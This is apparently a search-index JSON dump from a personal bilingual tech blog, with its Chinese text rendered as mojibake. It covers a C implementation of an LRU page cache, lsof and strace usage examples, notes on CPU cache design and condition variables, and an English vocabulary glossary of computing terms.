hash-\u003ecapacity * sizeof( QNode* ) ); // Initialize all hash entries as empty int i; for( i = 0; i \u003c hash-\u003ecapacity; ++i ) hash-\u003earray[i] = NULL; return hash; } // A function to check if there is slot available in memory int AreAllFramesFull( Queue* queue ) { return queue-\u003ecount == queue-\u003enumberOfFrames; } // A utility function to check if queue is empty int isQueueEmpty( Queue* queue ) { return queue-\u003erear == NULL; } // A utility function to delete a frame from queue void deQueue( Queue* queue ) { // åˆ¤æ–­é˜Ÿåˆ—æ˜¯ä¸æ˜¯ç©º if( isQueueEmpty( queue ) ) return; // If this is the only node in list, then change front // åªæœ‰ä¸€ä¸ª node if (queue-\u003efront == queue-\u003erear) queue-\u003efront = NULL; // Change rear and remove the previous rear QNode* temp = queue-\u003erear; queue-\u003erear = queue-\u003erear-\u003eprev; if (queue-\u003erear) queue-\u003erear-\u003enext = NULL; free( temp ); // decrement the number of full frames by 1 queue-\u003ecount--; } // A function to add a page with given 'pageNumber' to both queue // and hash void Enqueue( Queue* queue, Hash* hash, unsigned pageNumber ) { // If all frames are full, remove the page at the rear if ( AreAllFramesFull ( queue ) ) { // remove page from hash // ç§»é™¤é˜Ÿå°¾ QNode hash-\u003earray[ queue-\u003erear-\u003epageNumber ] = NULL; deQueue( queue ); } // Create a new node with given page number, // And add the new node to the front of queue QNode* temp = newQNode( pageNumber ); temp-\u003enext = queue-\u003efront; // If queue is empty, change both front and rear pointers if ( isQueueEmpty( queue ) ) queue-\u003erear = queue-\u003efront = temp; else // Else change the front { // é˜Ÿé¦–å‰ä¸€ä¸ª Node æ˜¯ temp queue-\u003efront-\u003eprev = temp; // é˜Ÿé¦–è°ƒæ•´æˆ temp queue-\u003efront = temp; } // Add page entry to hash also hash-\u003earray[ pageNumber ] = temp; // increment number of full frames queue-\u003ecount++; } // This function is called when a page with given 'pageNumber' is referenced // from cache (or memory). There are two cases: // 1. Frame is not there in memory, we bring it in memory and add to the front // of queue // 2. Frame is there in memory, we move the frame to front of queue void ReferencePage( Queue* queue, Hash* hash, unsigned pageNumber ) { QNode* reqPage = hash-\u003earray[ pageNumber ]; // the page is not in cache, bring it if ( reqPage == NULL ) Enqueue( queue, hash, pageNumber ); // page is there and not at front, change pointer else if (reqPage != queue-\u003efront) { // Unlink rquested page from its current location // in queue. æŠŠè¿™ä¸ª Node ä»é˜Ÿåˆ—ä¸Šæ‹¿ä¸‹æ¥ reqPage-\u003eprev-\u003enext = reqPage-\u003enext; // è¿™ä¸ª Node ä¸æ˜¯æœ€åä¸€ä¸ª if (reqPage-\u003enext) // reqPage çš„ä¸‹ä¸€ä¸ª Node çš„ prev æŒ‡å‘ reqPage çš„å‰ä¸€ä¸ª Node reqPage-\u003enext-\u003eprev = reqPage-\u003eprev; // If the requested page is rear, then change rear // as this node will be moved to front // reqPage æ˜¯é˜Ÿå°¾ if (reqPage == queue-\u003erear) { // æ›´æ”¹é˜Ÿå°¾ Node queue-\u003erear = reqPage-\u003eprev; // é˜Ÿå°¾ Node æ²¡æœ‰ä¸‹ä¸€ä¸ª Node äº† queue-\u003erear-\u003enext = NULL; } // Put the requested page before current front // reqPage æˆä¸ºæ–°çš„é˜Ÿé¦– Node reqPage-\u003enext = queue-\u003efront; reqPage-\u003eprev = NULL; // Change prev of current front // old é˜Ÿé¦–çš„ prev å˜æˆ reqPage reqPage-\u003enext-\u003eprev = reqPage; // Change front to the requested page // é˜Ÿåˆ—çš„é˜Ÿé¦–æ˜¯ reqPage queue-\u003efront = reqPage; } } // Driver program to test above functions int main() { // 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 // Let cache can hold 3 pages Queue* q = createQueue( 3 ); // Let 6 different pages can be requested (pages to be // referenced are numbered from 0 to 5 Hash* hash = createHash( 6 ); // Let us refer pages 1, 2, 3, 4, 1, 2, 5, 1, 2, 3, 4, 5 ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 3); ReferencePage( q, hash, 4); ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 5); ReferencePage( q, hash, 1); ReferencePage( q, hash, 2); ReferencePage( q, hash, 3); ReferencePage( q, hash, 4); ReferencePage( q, hash, 5); // Let us print cache frames after the above referenced pages printf (\"%d \", q-\u003efront-\u003epageNumber); printf (\"%d \", q-\u003efront-\u003enext-\u003epageNumber); printf (\"%d \", q-\u003efront-\u003enext-\u003enext-\u003epageNumber); return 0; } ","references#References":" least recently used cache wiki "},"title":"cache-replacement-policy-lru"},"/blog/clang-structure/":{"data":{"reference#reference":" flexible-array-members-structure-c ","size-of-structure#size of structure":"size of structure"},"title":"clang-structure"},"/blog/cmd-lsof/":{"data":{"":"","lsof--a--c-java--d-3-10#lsof \u003ccode\u003e-a\u003c/code\u003e \u003ccode\u003e-c\u003c/code\u003e java \u003ccode\u003e-d\u003c/code\u003e 3-10":"","lsof--c-java#lsof \u003ccode\u003e-c\u003c/code\u003e \u003ccode\u003e^\u003c/code\u003ejava":"","lsof--c-java-1#lsof \u003ccode\u003e-c\u003c/code\u003e java":"","lsof--d-1#lsof \u003ccode\u003e-d\u003c/code\u003e 1":"","lsof--d-12#lsof \u003ccode\u003e-d\u003c/code\u003e 1,2":"","lsof--iinternet#lsof -i(internet)":"","lsof--p-pid#lsof \u003ccode\u003e-p\u003c/code\u003e pid":"","lsof--t-testsock#lsof \u003ccode\u003e-t\u003c/code\u003e /test.sock":"","lsof--u#lsof \u003ccode\u003e-U\u003c/code\u003e":"é€šç”¨ ^ è¡¨ç¤ºé å¤šä¸ªå€¼æ˜¯ CSV å½¢å¼ lsof -i(internet) -i åå¯ä»¥æœ‰ç©ºæ ¼ [46][protocol][@hostname|hostaddr][:service|port]\n46 specifies the IP version, IPv4 or IPv6 that applies to the following address.â€˜6â€™ may be be specified only if the UNIX dialect supports IPv6. If neither â€˜4â€™ nor â€˜6â€™ is specified, the following address applies to all IP versions. protocol is a protocol name - TCP, UDP hostname is an Internet host name. Unless a specific IP version is specified, open network files associated with host names of all versions will be selected. hostaddr is a numeric Internet IPv4 address in dot form; or an IPv6 numeric address in colon form enclosed in brackets, if the UNIX dialect supports IPv6. When an IP version is selected, only its numeric addresses may be specified. service is an /etc/services name - e.g., smtp -or a list of them. port is a port number, or a list of them. lsof -i@10.10.129.99:8080 lsof -i4tcp all ipv4 tcp\nlsof -i4udp all ipv4 udp\nlsof -i4udp@localhost all localhost ipv4 udp\nlsof -i4tcp@10.10.129.99 all 10.10.129.99 tcp\nlsof -i :ssh service ssh\nlsof -i:22 port 22\nlsof -iTCP -sTCP:LISTEN tcp state Listen\nlsof -p pid by pid\nlsof /test.sock lsof -t /test.sock -t(terse) ç®€è¦çš„ get pid\nlsof -c ^java æ‰¾åˆ°ä»¥é java å‘½ä»¤(command)å¼€å§‹çš„\nlsof -c java æ‰¾åˆ°ä»¥ java å‘½ä»¤(command)å¼€å§‹çš„\nlsof +d /dir è¯¥ /dirç›®å½•(directory) ä¸‹æ‰€æœ‰\nlsof -d 1 æŸ¥çœ‹ descriptor = 1(æ ‡å‡†è¾“å‡º)\nlsof -d 1,2 æŸ¥çœ‹ descriptor = 1,2(æ ‡å‡†è¾“å‡ºã€æ ‡å‡†é”™è¯¯)\nlsof -a -c java -d 3-10 æ¡ä»¶ç»„åˆæŸ¥è¯¢ -a(and) -c(command) -d(èŒƒå›´)\nlsof -u root è¯¥ root ä¸‹æ‰€æœ‰ -u(user)\nlsof -U -U(Unix domain socket)","lsof--u-root#lsof \u003ccode\u003e-u\u003c/code\u003e root":"","lsof-d-dir#lsof \u003ccode\u003e+d\u003c/code\u003e /dir":"","lsof-testsock#lsof /test.sock":"","é€šç”¨#é€šç”¨":""},"title":"lsof examples"},"/blog/cmd-strace/":{"data":{"references#References":" https://jvns.ca/strace-zine-v2.pdf https://man7.org/linux/man-pages/man1/strace.1.html https://strace.io/ ","strace#strace":"","strace--t--ff--o-maintestlog--f--java-maintest#strace -t -ff -o MainTest.log -f  java MainTest":"","strace--tt--ff--o-maintestlog---f--e-tracefutexwrite--java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=futex,write  java MainTest":"","strace--tt--ff--o-maintestlog---f--e-tracefutexwrite-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=futex,write java MainTest":"","strace--tt--ff--o-maintestlog---f--e-traceipc--java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%ipc  java MainTest":"syscallæ“ä½œç³»ç»Ÿè¿è¡Œåœ¨ kernel space, æ‹¥æœ‰æ•´ä¸ªç³»ç»Ÿçš„æ§åˆ¶æƒã€‚ åº”ç”¨ç¨‹åºè¿è¡Œåœ¨ user space, æ‹¥æœ‰éƒ¨åˆ†æƒé™ã€‚ è¿™å°±æ˜¯éš”ç¦»ã€‚ To prevent user applications from accessing or modifying critical operating system data. æƒ³è®©æ“ä½œç³»ç»Ÿåšäº›äº‹æƒ…æ€ä¹ˆåŠï¼Ÿä½¿ç”¨ syscallã€‚\nstracestrace -t -ff -o MainTest.log -f java MainTest -t time -ff follow-fork -o output strace -tt -ff -o MainTest.log -f -e trace=futex,write java MainTest -ff -o æ¯ä¸€ä¸ªè¿›ç¨‹çš„ log å•ç‹¬å†™åˆ°ä¸€ä¸ªæ–‡ä»¶\n-rw-rw-r-- 1 yang yang 13468 Apr 20 21:10 MainTest.log.21792 -rw-rw-r-- 1 yang yang 455425 Apr 20 21:10 MainTest.log.21793 -rw-rw-r-- 1 yang yang 1254 Apr 20 21:10 MainTest.log.21794 -rw-rw-r-- 1 yang yang 1361 Apr 20 21:10 MainTest.log.21795 -rw-rw-r-- 1 yang yang 3802 Apr 20 21:10 MainTest.log.21796 -rw-rw-r-- 1 yang yang 1677 Apr 20 21:10 MainTest.log.21797 -rw-rw-r-- 1 yang yang 1705 Apr 20 21:10 MainTest.log.21798 -rw-rw-r-- 1 yang yang 1797 Apr 20 21:10 MainTest.log.21810 -rw-rw-r-- 1 yang yang 6087 Apr 20 21:10 MainTest.log.21811 -rw-rw-r-- 1 yang yang 5541 Apr 20 21:10 MainTest.log.21812 -rw-rw-r-- 1 yang yang 1444 Apr 20 21:10 MainTest.log.21813 -rw-rw-r-- 1 yang yang 33890 Apr 20 21:10 MainTest.log.21814 -rw-rw-r-- 1 yang yang 3996 Apr 20 21:10 MainTest.log.21822 strace -tt -ff -o MainTest.log -f -e trace=futex,write java MainTest -e expr å¤šä¸ª syscall CSV å½¢å¼\nstrace -tt -ff -o MainTest.log -f -e trace=%process java MainTest strace -tt -ff -o MainTest.log -f -e trace=%memory -a java MainTest strace -tt -ff -o MainTest.log -f -e trace=%ipc java MainTest ","strace--tt--ff--o-maintestlog---f--e-tracememory--a-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%memory -a java MainTest":"","strace--tt--ff--o-maintestlog---f--e-traceprocess-java-maintest#strace -tt -ff -o MainTest.log  -f -e trace=%process java MainTest":"","syscall#syscall":""},"title":"Cmd Strace"},"/blog/cs-cache/":{"data":{"":" There can be many caches stacked on top of each other. Cache å¯ä»¥ä¸€å±‚ä¸€å±‚ç´¯ç§¯ã€‚\nif you miss in one you try in the â€œlower level cacheâ€ Lower level, mean higher number. åœ¨ä¸Šå±‚çš„ Cache miss äº†ï¼Œå¯ä»¥åœ¨ä¸‹å±‚çš„ Cache å»æ‰¾ã€‚ä¾æ¬¡ç±»æ¨ã€‚ There can also be separate caches for data and instructions. Or the cache can be â€œunifiedâ€. æ•°æ®å’ŒæŒ‡ä»¤çš„ Cache å¯ä»¥ç‹¬ç«‹ï¼Œä¹Ÿå¯ä»¥æ··åˆã€‚ to wit: the L1 data cache (d-cache) is the one nearest processor. It corresponds to the â€œdata memoryâ€ block in our pipeline diagrams the L1 instruction cache (i-cache) corresponds to the â€œinstruction memoryâ€ block in our pipeline diagrams. The L2 sits underneath the L1s. There is often an L3 in modern systems. ","cache-æŒ‡å¯¼æ€æƒ³#cache æŒ‡å¯¼æ€æƒ³":"å±€éƒ¨æ€§åŸç† temporal locality (æ—¶é—´å±€éƒ¨æ€§) Taking advantage of temporal locality:\nbring data into cache whenever its referenced kick out something that hasnâ€™t been used recently spatial locality (ç©ºé—´å±€éƒ¨æ€§) Taking advantage of spatial locality: bring in a block of contiguous data (cacheline), not just the requested data.","references#References":" CSE141-Caching-Intro CSE141-Caching CSE141-Caches-Details x86-cache memory-hotplug Cache æ˜¯æ€æ ·ç»„ç»‡å’Œå·¥ä½œçš„ï¼Ÿ cacheinfo-windows intel-cpu-cache caches3-w.pdf wiki-cpu-cache cos316-10-cpu-cache.pdf cos355-Intel-CacheOverview ç»†è¯´Cache-L1/L2/L3/TLB ","åŸºæœ¬é—®é¢˜#åŸºæœ¬é—®é¢˜":"æ€æ ·æ‰¾åˆ° cache ä¸­çš„æ•°æ®ï¼Ÿ ä»¥ 32bits çš„å†…å­˜åœ°å€ï¼Œæ¥åˆ†æã€‚ (index, offset) äºŒç»´åæ ‡æ¥å®šä½ä¸€ä¸ª byte çš„æ•°æ®ã€‚\nindex å®šä½ cache lineï¼Œå¯è§†ä¸ºæ¨ªåæ ‡ã€‚ ç°åœ¨å¯ä»¥é€šè¿‡ cache lines = cache size / cache line size æ¥è®¡ç®—ã€‚ index bits = log2(cache lines)\noffset é€šè¿‡ index å®šä½åˆ° cache line åï¼Œoffset å®šä½åˆ°è¿™ä¸ª cache line çš„å“ªä¸€ä¸ª byteã€‚ å¯ä»¥è§†ä¸ºçºµåæ ‡ã€‚ offset bits = log2(offset)\ntag 32bits å‰©ä¸‹çš„éƒ¨åˆ†ã€‚\ncache line åº”è¯¥æ˜¯å¤šå¤§ï¼Ÿ è¿™å…¶å®æ˜¯åˆ†å—(block)æ€æƒ³ã€‚åœ¨åˆ©ç”¨ç©ºé—´å±€éƒ¨æ€§åŸç†ã€‚\ncache line size è¶Šå¤§ Exploits more spatial locality. Large cache lines effectively prefetch data that we have not explicitly asked for. æ›´å¥½åœ°åˆ©ç”¨ç©ºé—´å±€éƒ¨æ€§ï¼Œæå‰è·å–å°†è¦è®¿é—®çš„æ•°æ®ã€‚ cache line size è¶Šå° Focuses on temporal locality. If there is little spatial locality, large cache lines waste space and bandwidth. èšç„¦åœ¨æ—¶é—´å±€éƒ¨æ€§ä¸Šï¼Œå¦‚æœæ²¡æœ‰è¾ƒå¥½çš„ç©ºé—´å±€éƒ¨æ€§ï¼Œæå‰ fetch äº†æ•°æ®ï¼Œé‚£å°±æµªè´¹äº†ç©ºé—´å’Œå¸¦å®½ã€‚ #(cache ç»„ç»‡æ–¹å¼)\nå®ä¾‹åˆ†æ å†…å­˜åœ°å€ 32bitsã€‚\n1024 cache lines, 32 Bytes per line. index bits = log2(1024) = 10 offset bits = log2(32) = 5 tags bits = 32 - index - offset = 17\n32KB cache, 64byte lines index bits = log2(32KB / 64Bytes) = 9 offset bits = log2(64) = 6 tags bits = 32 - 9 - 6 = 17\nset æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ (set) Associativity means providing more than one place for a cache line to live. One group of lines corresponds to each index.\nit is called a â€œsetâ€ Each line in a set is called a â€œwayâ€ N-Way associativity requires N parallel comparators set = ï¼Ÿ {% asset_img cache-2-ways-cache.svg 2-ways-cache%} cache å“ªä¸€ç§ addressï¼Ÿ virtual memory address physical memory address #(ç¼“å­˜ç±»å‹)"},"title":"cs-cache"},"/blog/cs-condition-variables/":{"data":{"":"","condition-variable-æ˜¯å•¥#condition variable æ˜¯å•¥ï¼Ÿ":"condition variable æ˜¯å•¥ï¼Ÿæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªçŠ¶æ€å˜é‡ +é˜Ÿåˆ—ã€‚ç°å®ä¸–ç•Œä¸­ï¼Œæƒ³è¦è¿›è¡Œä¸‹ä¸€æ­¥çš„è¡ŒåŠ¨ï¼Œå¾€å¾€éœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶(condition)ã€‚å¦‚åå­—è·¯å£çš„äº¤é€šä¿¡å·ç¯ï¼Œä¿¡å·ç¯çš„é¢œè‰²å¯ä»¥è§†ä¸ºçŠ¶æ€å˜é‡ï¼Œæ ¹æ®ä¸åŒçš„çŠ¶æ€ï¼Œæ±½è½¦åšå‡ºä¸åŒçš„é€‰æ‹©ã€‚ä¸€æ¡é©¬è·¯ï¼Œå¯ä»¥è§†ä¸ºé˜Ÿåˆ—ã€‚çº¢ç¯æ—¶, æ±½è½¦å°±ä¸èƒ½é€šè¿‡ï¼Œæ’é˜Ÿç­‰å€™ã€‚ç»¿ç¯æ—¶ï¼Œæ±½è½¦æ‰å¯ä»¥é€šè¿‡ã€‚åœ¨è®¡ç®—æœºä¸­ï¼ŒåŒæ ·å­˜åœ¨è¿™æ ·çš„é—®é¢˜ï¼Œå¦‚çˆ¶è¿›ç¨‹éœ€è¦ç­‰å¾…å­è¿›ç¨‹å®Œæˆå(æ¡ä»¶)ï¼Œæ‰èƒ½ç»§ç»­è¿è¡Œã€‚å…³é”®å°±æ˜¯å›´ç»•çŠ¶æ€å˜é‡æ¥æ„å»ºã€‚","reference#Reference":" pthread_cond_wait pthread_cond_signal "},"title":"cs-condition-variables"},"/blog/cs-english-words/":{"data":{"":"","a#a":" association a connection or cooperative link between people or organizations\nallot to assign as a share or portion\nad-hoc An ad hoc activity or organization is done or formed only because a situation has made it necessary and is not planned in advance.Ad hoc is a word that originally comes from Latin and means â€œfor thisâ€ or \"for this situation.\" In current American English it is used to describe something that has been formed or used for a special and immediate purpose, without previous planning. æ¯”å¦‚ shell å¯ä»¥ç›´æ¥æ‰§è¡Œä¸€æ¬¡æ€§çš„å‘½ä»¤ï¼Œè¿™å°±æ˜¯ ad-hocï¼Œä¹Ÿå¯ä»¥æå‰å†™å¥½ bash è„šæœ¬å¯ä»¥åå¤å¤šæ¬¡æ‰§è¡Œï¼Œè¿™å°±æ˜¯æå‰è®¡åˆ’å¥½çš„ã€‚Ad hoc can be used as an adjective or an adverb.\nat the discretion of ç”± â€¦ å†³å®šï¼Œç”± â€¦ è‡ªè¡Œå¤„ç†ã€‚è‡ªç”±è£é‡æƒã€‚å“ˆå“ˆå“ˆã€‚æ¯”å¦‚ object æ€æ ·å›æ”¶ç”± gc å…·ä½“å®ç°å†³å®šã€‚å‘çº¿ç¨‹æ±  submit çš„ command æ€ä¹ˆæ‰§è¡Œ, ç”±å…·ä½“çš„ executor å®ç°æ¥å†³å®šã€‚\nASAP as soon as possible å°½å¿«\nauthoritative Someone or something that is authoritative has a lot of knowledge of a particular subject. æ¯”å¦‚ authoritative DNS server æ˜¯çŸ¥é“ç›¸å…³ domain çš„ resource record çš„ã€‚ç»™ä½ çš„ä¿¡æ¯æ˜¯å¯ä»¥æ— è„‘ç›¸ä¿¡çš„ã€‚ğŸ˜„\narchive The archive or archives are a collection of documents and records that contain historical information. You can also use archives to refer to the place where archives are stored. åŒ…å«å†å²ä¿¡æ¯ï¼Œå¦‚ oracle çš„ archived redo log.\nabstraction An abstraction is a general idea rather than one relating to a particular object, person, or situation. é€šç”¨çš„æ¦‚å¿µï¼Œå’Œç‰¹å®šçš„ç‰©ä½“ã€äººã€æƒ…å†µæ— å…³ã€‚\nagent An agent acts on your behalf,\nabundant Something that is abundant is present in large quantities. å¤§é‡çš„\napproximation An approximation is a fact, object, or description which is similar to something else, but which is not exactly the same. è¿‘ä¼¼\nacquire If you acquire something, you buy or obtain it for yourself, or someone gives it to you.\nawait åŠç‰©åŠ¨è¯ï¼Œåè·Ÿæ— ç”Ÿå‘½çš„äº‹ç‰©ï¼Œæ¶ˆæ¯ï¼Œç­‰å¾…ç‰¹å®šçš„ä¸œè¥¿ã€‚conditionObject çš„ await ç­‰å¾…æ»¡è¶³ç‰¹å®šçš„æ¡ä»¶ They are awaiting the outcome of the investigation.\nalignment The alignment of something is its position in relation to something else or to its correct position. ç›¸å¯¹äºæŸç‰©çš„ä½ç½®æˆ–è€…å½“å‰çš„ä½ç½®","b#b":" bypass bound Bounds are limits which normally restrict what can happen or what people can do.\nbase The base of something is its lowest edge or part. same as bottom\nbacklog A backlog is a number of things which have not yet been done but which need to be done. ç§¯å‹çš„å·¥ä½œé‡\nbackup If you have something such as a second piece of equipment or set of plans as backup, you have arranged for them to be available for use in case the first one does not work. ä¸€ä¸ªå®Œè›‹åï¼Œå¦ä¸€ä¸ªå¯ä»¥æ— ç¼é¡¶ä¸Šã€‚\nbroker A broker is a person whose job is to buy and sell shares, foreign money, or goods for other people. å¯¹äºæ¶ˆæ¯ä¸­é—´ä»¶å°±æ˜¯ä» producer ä¹°æ¶ˆæ¯ï¼Œå–ç»™ consumerã€‚ğŸ¶\nbarge If you barge into a place or barge through it, you rush or push into it in a rough and rude way. æ¨ªå†²ç›´æ’ï¼Œéå…¬å¹³é”ï¼Œè·å–æ—¶ä¸Šæ¥å°± casState","c#c":" context the circumstances that form the setting for an event, statement, or idea, and in terms of which it can be fully understood and asserted.\ncardinality the number of elements in a given mathematical set ç»™å®šé›†åˆçš„å…ƒç´ æ•°é‡\ncompound Compound is used to indicate that something consists of two or more parts or things.\nconsensus A consensus is general agreement among a group of people. ä¸€ç¾¤äººè¾¾æˆçš„åè®®ã€‚å…±è¯†ã€‚\ncoalesce If two or more things coalesce, they come together and form a larger group or system. åˆå¹¶\ncounterbalance To counterbalance something means to balance or correct it with something that has an equal but opposite effect ç›¸ç­‰ä½†æ˜¯æœ‰ç›¸åä½œç”¨çš„\ncompulsory If something is compulsory, you must do it or accept it, because it is the law or because someone in a position of authority says you must.","d#d":" domain an area of territory owned or controlled by a ruler or government.\ndurable Something that is durable is strong and lasts a long time without breaking or becoming weaker\ndiscretion If someone in a position of authority uses their discretion or has the discretion to do something in a particular situation, they have the freedom and authority to decide what to do. è‡ªç”±è£é‡æƒã€‚æ²¡æœ‰è§„èŒƒçš„æƒ…å†µä¸‹ï¼Œç”±æœ‰æƒå¨çš„äººè¿›è¡Œ\"åœ£è£\"ã€‚\ndelegation A delegation is a group of people who have been sent somewhere to have talks with other people on behalf of a larger group of people. ä»£è¡¨æ›´å¤§é›†å›¢çš„ä¸€ä¸ªå’Œå…¶ä»–äººäº¤æµçš„å°é›†å›¢\ndefer If you defer an event or action, you arrange for it to happen at a later date, rather than immediately or at the previously planned time. å»¶è¿Ÿåˆ°å°†æ¥å‘ç”Ÿçš„äº‹æƒ…\ndedicated You use dedicated to describe something that is made, built, or designed for one particular purpose or thing. ä¸“ç”¨","e#e":" eligible qualified to participate or be chosen\nexception An exception is a particular thing, person, or situation that is not included in a general statement, judgment, or rule.\nentity An entity is something that exists separately from other things and has a clear identity of its own. ç‹¬ç«‹æœ‰æ¸…æ™°æ ‡è¯†çš„ä¸œè¥¿\nephemeral If you describe something as ephemeral, you mean that it lasts only for a very short time. åªæŒç»­è¾ƒçŸ­æ—¶é—´çš„ä¸œè¥¿ã€‚çŸ­æš‚çš„ã€‚\nexclusive If two things are mutually exclusive, they are separate and very different from each other, so that it is impossible for them to exist or happen together. ä¸å¯å…±å­˜\nefficiency Efficiency is the quality of being able to do a task successfully, without wasting time or energy. ä½•è°“æ•ˆç‡ï¼Ÿä¸æµªè´¹æ—¶é—´æˆ–èƒ½é‡ã€‚\nentry An entry in a diary, account book, computer file, or reference book is a short piece of writing in it.\nevict If someone is evicted from the place where they are living, they are forced to leave it, usually because they have broken a law or contract. é©±é€","f#f":" failover The designed ability of a server, network or other computer system to switch over automatically to a redundant or standby system in order to avoid loss of access in the event of a failure of the primary system.\nfallback Someoneâ€™s fallback position is what they will do if their plans do not succeed, or if something unexpected happens.\nfield A field is an area of a computer's memory or a program where data can be entered, edited, or stored.\nfactor out åˆ†è§£\nfragemented If something fragments or is fragmented, it breaks or separates into small pieces or parts. ç¢ç‰‡åŒ–\nflexible Something or someone that is flexible is able to change easily and adapt to different conditions and circumstances as they occur.","g#g":" gateway a gateway converts between protocols","h#h":" handle A handle is the part of an object such as a tool, bag, or cup that you hold in order to be able to pick up and use the object.\nheap A heap of things is a pile of them, especially a pile arranged in a rather untidy way. ä¸è§„æ•´æ”¾ç½®çš„ä¸œè¥¿","i#i":" independent not connected with another or with each other; separate äº’ä¸å…³è”ï¼Œåˆ†ç¦»çš„ If one thing or person is independent of another, they are separate and not connected, so the first one is not affected or influenced by the second.\nintegrity The integrity of something such as a group of people or a text is its state of being a united whole. å®Œæ•´æ€§\ninterpose If you interpose something between two people or things, you place it between them. å°† â€¦ ç½®äºä¸¤è€…ä¹‹é—´ï¼Œä¸­é—´å±‚ã€‚\ninherent The inherent qualities of something are the necessary and natural parts of it. å¤©ç”Ÿå°±æœ‰çš„ã€‚èµ„æœ¬ä¸€å‡ºç”Ÿå°±å¸¦ç€â€¦\ni.e. i.e .is used to introduce a word or sentence which makes what you have just said clearer or gives details. å³æ˜¯,è¿›ä¸€æ­¥è§£é‡Šæ¸…æ¥š\ninterface The interface between two subjects or systems is the area in which they affect each other or have links with each other. ä¸¤ä¸ªä¹‹é—´çš„ä¸œè¥¿ï¼Œé‚£å¯ä¸å°±æ˜¯ä¸­é—´å±‚ä¹ˆï¼Ÿ\nimmense If you describe something as immense, you mean that it is extremely large or great.\ninterfere If you say that someone interferes in a situation, you mean they get involved in it although it does not concern them and their involvement is not wanted. å¹²æ¶‰\ninbound An inbound flight is one that is arriving from another place. å…¥ç«™çš„ã€‚åä¹‹ outboundã€‚","j#j":"","k#k":"","l#l":" lifetime A lifetime is the length of time that someone is alive. æŸäººæ´»ç€çš„æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯äº«å¹´å¤šä¹…ã€‚ The lifetime of a particular thing is the period of time that it lasts. æŸäº‹ç‰©å­˜åœ¨çš„æ—¶é•¿ã€‚\nleave options open æš‚ä¸å†³å®š ","m#m":" majority The majority of people or things in a group is more than half of them. ä»€ä¹ˆæ˜¯ majorityã€‚è¶…è¿‡ä¸€åŠçš„äºº/äº‹ç‰©æ‰å« majorityã€‚zookeeper cluster æ¨è server æ•°é‡å¥‡æ•°ã€‚\nmediator a person or an organization that tries to get agreement between people or groups who disagree with each other å¤šæ–¹åŠ¿åŠ›ä¹‹é—´çš„è°ƒåœè€…","n#n":"","o#o":" overhead é¢å¤–çš„è´¹ç”¨ã€æ¶ˆè€—\non the fly If you do something on the fly, you do it quickly without thinking about it or planning it in advance, especially while something else is happening. æ²¡æœ‰æå‰è®¡åˆ’åšäº‹æƒ…æˆ–è€…ä¸å‡æ€ç´¢åšäº‹æƒ…\noverlap If one thing overlaps another, or if you overlap them, a part of the first thing occupies the same area as a part of the other thing. You can also say that two things overlap. ç©ºé—´ä¸Šé‡å \noutstanding Outstanding issues or problems have not yet been resolved. è¿˜æ²¡å®Œæˆçš„ã€è¿˜æ²¡è§£å†³çš„ã€‚è‹¥ç”¨ tcp ç¡®è®¤æœºåˆ¶ï¼Œå°±æ˜¯ unacknowledged çš„åŒ…ã€‚\noffset If one thing is offset by another, the effect of the first thing is reduced by the second, so that any advantage or disadvantage is cancelled out. æŠµæ¶ˆ Refers to the distance between a base address (starting memory location) and a specific address","p#p":" precedence the condition of being considered more important than someone or something else; priority in importance, order, or rank. ä¼˜å…ˆçº§\nparenthesis æ‹¬å·\npreemptive serving or intended to preempt or forestall something, especially to prevent attack by disabling the enemy.\npopulate to provide with members å¯¹è±¡å¡«å……æˆå‘˜å±æ€§\nparameter Parameters are factors or limits which affect the way that something can be done or made.\nproxy A proxy is a person or thing that is acting or being used in the place of someone or something else.\npayload The payload of an aircraft or spacecraft is the amount or weight of things or people that it is carrying.\nproceed If you proceed to do something, you do it, often after doing something else first. å…ˆåšå®Œä¸€ä»¶äº‹ï¼Œæ¥ç€åšå¦ä¸€ä»¶äº‹ã€‚\npending If something is done pending a future event, it is done until that event happens.\npost- Post- is used to form words that indicate that something takes place after a particular date, period, or event.\npre- Pre- is used to form words that indicate that something takes place before a particular date, period, or event.\nper se Per se means â€˜by itselfâ€™ or â€˜in itselfâ€™, and is used when you are talking about the qualities of one thing considered on its own, rather than in connection with other things. æœ¬èº«ï¼Œæœ¬è´¨ä¸Š\npermissible If something is permissible, it is considered to be acceptable because it does not break any laws or rules. ä¸è¿åæ³•å¾‹å’Œè§„åˆ™å³ä¸ºå…è®¸çš„\nproxy a proxy emulates a service provided by a server that is not contacted directly by the client itself\nrespectively Respectively means in the same order as the items that you have just mentioned. å’Œåˆšåˆšæåˆ°è¿‡çš„ä¿æŒä¸€è‡´çš„é¡ºåºã€‚ç›¸åº”åœ°\npremise a premise is something that you suppose is true and that you use as a basis for developing an idea. å‰æ\nprivileged Someone who is privileged has an advantage or opportunity that most other people do not have, often because of their wealth or high social class. ç‰¹æƒ\npile A pile of things is a quantity of things that have been put neatly somewhere so that each thing is on top of the one below. ä¸€ä¸ªæ‘ä¸€ä¸ª stack\nportion A portion of something is a part of it.\npossession If you are in possession of something, you have it, because you have obtained it or because it belongs to you. å æœ‰","q#q":"","r#r":" relinquish to stop having sth, especially when this happens unwillingly æŠ¢å å¼è°ƒåº¦ï¼Œtimer å®šæ—¶ä¸­æ–­ï¼Œtime slice ç”¨å®Œï¼Œå¿…é¡»è®©å‡º CPUã€‚ voluntarily cease to keep or claim; give up. è‡ªæ„¿æ”¾å¼ƒ to give over possession or control of : YIELD æ”¾å¼ƒæ§åˆ¶\nreference A reference is something such as a number or a name that tells you where you can obtain the information you want. èƒ½ä»ä¸­è·å–ä¿¡æ¯çš„ä¸œè¥¿ï¼Œéš”ä¸€å±‚ã€‚you-\u003ereference-\u003einfo\nroutine A routine is a computer program, or part of a program, that performs a specific function.","s#s":" sparse thinly dispersed or scattered, ç¨€ç–çš„ Something that is sparse is small in number or amount and spread out over an area.\nslot a long, narrow aperture or slit in a machine for something to be inserted an allotted place in a arrangement or plan such as a broadcasting 